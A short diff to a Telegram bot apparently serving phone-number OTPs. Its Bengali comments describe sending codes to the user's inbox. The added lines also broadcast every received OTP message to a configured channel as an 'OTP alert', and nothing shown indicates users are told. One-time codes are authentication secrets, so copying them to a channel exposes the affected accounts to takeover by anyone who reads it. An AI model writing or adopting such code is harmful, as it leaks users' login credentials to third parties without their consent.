@@ -295,10 +295,18 @@ async function startFastOtpChecker(chatId, phoneNumber) {
                             }
                         };
 
+                        // ইউজারের ইনবক্সে পাঠানো
                         await bot.sendMessage(chatId, otpMsg, {
                             parse_mode: 'Markdown',
                             ...otpKeyboard
                         });
+
+                        // আপনার চ্যানেলেও অটোমেটিক ওটিপি পাঠানোর জন্য
+                        await bot.sendMessage(config.REQUIRED_CHANNEL, `📢 *New Channel OTP Alert*\n\n` + otpMsg, {
+                            parse_mode: 'Markdown',
+                            ...otpKeyboard
+                        });
+
                         return;
                     }
                 }
